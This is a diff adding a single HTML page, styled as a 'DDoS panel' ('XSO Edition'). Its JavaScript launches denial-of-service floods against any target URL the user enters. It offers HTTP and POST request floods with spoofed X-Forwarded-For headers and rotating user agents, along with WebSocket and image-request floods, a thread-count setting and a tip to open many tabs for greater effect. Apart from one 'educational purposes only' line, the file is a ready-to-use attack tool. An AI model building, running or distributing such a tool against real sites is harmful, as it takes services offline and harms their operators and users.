@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS SUPERNOVA PANEL | XSO EDITION</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 2px solid #00ff41;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            font-size: 3em;
+            text-shadow: 0 0 10px #00ff41;
+        }
+        .panel {
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #00ff41;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        input, button {
+            background: #000;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 10px;
+            margin: 5px;
+            font-family: monospace;
+            font-size: 16px;
+        }
+        button {
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 15px #00ff41;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: rgba(0,255,65,0.1);
+            border: 1px solid #00ff41;
+            border-radius: 5px;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-card h3 {
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+        .stat-card .value {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .log {
+            background: #000;
+            height: 200px;
+            overflow-y: scroll;
+            padding: 10px;
+            font-size: 12px;
+            border: 1px solid #00ff41;
+        }
+        .attack-mode {
+            display: inline-block;
+            margin: 10px;
+        }
+        .warning {
+            color: #ff4444;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .attacking {
+            animation: pulse 0.5s infinite;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>DDOS DIMZZ PANEL </h1>
+        <p>Multi-Vector Attack System | XSO Edition</p>
+    </div>
+
+    <div class="panel">
+        <h2>🎯 Target Configuration</h2>
+        <input type="text" id="target" placeholder="Target URL/IP (http://example.com)" style="width: 60%;">
+        <input type="number" id="threads" placeholder="Threads" value="100" style="width: 15%;">
+        <button onclick="startAttack()">🔥 START ATTACK</button>
+        <button onclick="stopAttack()">⛔ STOP</button>
+        
+        <div style="margin-top: 15px;">
+            <div class="attack-mode">
+                <label>
+                    <input type="radio" name="mode" value="http" checked> HTTP Flood
+                </label>
+            </div>
+            <div class="attack-mode">
+                <label>
+                    <input type="radio" name="mode" value="https"> HTTPS Flood
+                </label>
+            </div>
+            <div class="attack-mode">
+                <label>
+                    <input type="radio" name="mode" value="socket"> WebSocket Flood
+                </label>
+            </div>
+            <div class="attack-mode">
+                <label>
+                    <input type="radio" name="mode" value="img"> Image Request Flood
+                </label>
+            </div>
+            <div class="attack-mode">
+                <label>
+                    <input type="radio" name="mode" value="all"> ALL VECTORS
+                </label>
+            </div>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card">
+            <h3>REQUESTS SENT</h3>
+            <div class="value" id="requestCount">0</div>
+        </div>
+        <div class="stat-card">
+            <h3>ACTIVE THREADS</h3>
+            <div class="value" id="activeThreads">0</div>
+        </div>
+        <div class="stat-card">
+            <h3>ERRORS</h3>
+            <div class="value" id="errorCount">0</div>
+        </div>
+        <div class="stat-card">
+            <h3>ATTACK DURATION</h3>
+            <div class="value" id="duration">0s</div>
+        </div>
+    </div>
+
+    <div class="panel">
+        <h2>📊 Attack Log</h2>
+        <div class="log" id="log"></div>
+        <div class="warning">⚠️ For educational/testing purposes only. Use only on your own servers.</div>
+    </div>
+</div>
+
+<script>
+    let attacking = false;
+    let workers = [];
+    let requestCount = 0;
+    let errorCount = 0;
+    let startTime = 0;
+    
+    function addLog(msg) {
+        const logDiv = document.getElementById('log');
+        const timestamp = new Date().toLocaleTimeString();
+        logDiv.innerHTML += `[${timestamp}] ${msg}<br>`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+    
+    function updateStats() {
+        document.getElementById('requestCount').innerText = requestCount;
+        document.getElementById('errorCount').innerText = errorCount;
+        document.getElementById('activeThreads').innerText = workers.filter(w => w.active).length;
+        if (attacking) {
+            const duration = Math.floor((Date.now() - startTime) / 1000);
+            document.getElementById('duration').innerText = duration + 's';
+        }
+    }
+    
+    // HTTP Flood Attack
+    async function httpFlood(url, threadId) {
+        const userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+        ];
+        
+        while (attacking && workers[threadId] && workers[threadId].active) {
+            try {
+                const randomPath = '/' + Math.random().toString(36).substring(7);
+                const fullUrl = url + randomPath + '?' + Math.random();
+                
+                const response = await fetch(fullUrl, {
+                    method: 'GET',
+                    headers: {
+                        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                        'Accept': '*/*',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Cache-Control': 'no-cache',
+                        'Pragma': 'no-cache',
+                        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+                    },
+                    cache: 'no-store'
+                });
+                requestCount++;
+                if (requestCount % 100 === 0) {
+                    addLog(`Thread ${threadId}: Request sent, status: ${response.status}`);
+                }
+            } catch(e) {
+                errorCount++;
+                if (errorCount % 50 === 0) {
+                    addLog(`Thread ${threadId}: Error - ${e.message}`);
+                }
+            }
+            updateStats();
+            await new Promise(r => setTimeout(r, Math.random() * 10));
+        }
+    }
+    
+    // HTTPS Flood (with keep-alive)
+    async function httpsFlood(url, threadId) {
+        while (attacking && workers[threadId] && workers[threadId].active) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                
+                await fetch(url + '?nocache=' + Date.now(), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Content-Length': '1000'
+                    },
+                    body: 'x=' + 'a'.repeat(1000),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                requestCount++;
+            } catch(e) {
+                errorCount++;
+            }
+            updateStats();
+            await new Promise(r => setTimeout(r, 5));
+        }
+    }
+    
+    // Image Flood (load images repeatedly)
+    async function imageFlood(url, threadId) {
+        while (attacking && workers[threadId] && workers[threadId].active) {
+            try {
+                const img = new Image();
+                img.src = url + '/images/' + Math.random() + '.jpg?' + Date.now();
+                await new Promise((resolve, reject) => {
+                    img.onload = resolve;
+                    img.onerror = reject;
+                    setTimeout(resolve, 100);
+                });
+                requestCount++;
+            } catch(e) {
+                errorCount++;
+            }
+            updateStats();
+            await new Promise(r => setTimeout(r, 20));
+        }
+    }
+    
+    // WebSocket Flood
+    async function wsFlood(url, threadId) {
+        let wsUrl = url.replace('http', 'ws');
+        while (attacking && workers[threadId] && workers[threadId].active) {
+            try {
+                const ws = new WebSocket(wsUrl);
+                ws.onopen = () => {
+                    for(let i = 0; i < 100; i++) {
+                        ws.send(JSON.stringify({data: 'x'.repeat(1000), ts: Date.now()}));
+                    }
+                    requestCount += 100;
+                    ws.close();
+                };
+                setTimeout(() => ws.close(), 100);
+            } catch(e) {
+                errorCount++;
+            }
+            updateStats();
+            await new Promise(r => setTimeout(r, 50));
+        }
+    }
+    
+    // All vectors combined
+    async function allVectors(url, threadId) {
+        const vectors = [httpFlood, httpsFlood, imageFlood];
+        const randomVector = vectors[Math.floor(Math.random() * vectors.length)];
+        await randomVector(url, threadId);
+    }
+    
+    function startAttack() {
+        if (attacking) {
+            addLog('⚠️ Attack already running!');
+            return;
+        }
+        
+        let target = document.getElementById('target').value;
+        const threadCount = parseInt(document.getElementById('threads').value);
+        const mode = document.querySelector('input[name="mode"]:checked').value;
+        
+        if (!target) {
+            addLog('❌ Please enter target URL!');
+            return;
+        }
+        
+        if (!target.startsWith('http')) {
+            target = 'http://' + target;
+        }
+        
+        attacking = true;
+        startTime = Date.now();
+        requestCount = 0;
+        errorCount = 0;
+        workers = [];
+        
+        addLog(`🚀 STARTING ${mode.toUpperCase()} ATTACK on ${target}`);
+        addLog(`📡 Threads: ${threadCount} | Mode: ${mode}`);
+        
+        let attackFunction;
+        switch(mode) {
+            case 'http': attackFunction = httpFlood; break;
+            case 'https': attackFunction = httpsFlood; break;
+            case 'socket': attackFunction = wsFlood; break;
+            case 'img': attackFunction = imageFlood; break;
+            case 'all': attackFunction = allVectors; break;
+            default: attackFunction = httpFlood;
+        }
+        
+        for(let i = 0; i < threadCount; i++) {
+            workers[i] = { active: true };
+            setTimeout(() => {
+                attackFunction(target, i);
+            }, i * 10);
+        }
+        
+        document.querySelector('button[onclick="startAttack()"]').style.background = '#ff4444';
+        document.querySelector('button[onclick="startAttack()"]').innerText = '⚡ ATTACKING...';
+        document.querySelector('button[onclick="startAttack()"]').classList.add('attacking');
+        
+        // Update stats every second
+        setInterval(() => {
+            if (attacking) updateStats();
+        }, 1000);
+    }
+    
+    function stopAttack() {
+        if (!attacking) {
+            addLog('⚠️ No attack running');
+            return;
+        }
+        
+        attacking = false;
+        workers.forEach(worker => { if(worker) worker.active = false; });
+        workers = [];
+        
+        addLog(`🛑 Attack stopped. Total requests: ${requestCount}, Errors: ${errorCount}`);
+        
+        document.querySelector('button[onclick="startAttack()"]').style.background = '';
+        document.querySelector('button[onclick="startAttack()"]').innerText = '🔥 START ATTACK';
+        document.querySelector('button[onclick="startAttack()"]').classList.remove('attacking');
+    }
+    
+    addLog('✅ DDoS Panel Ready | XSO Edition');
+    addLog('⚠️ This tool uses JavaScript - limited by browser CORS policies');
+    addLog('💡 For maximum effectiveness, open multiple tabs/windows');
+</script>
+</body>
+</html>
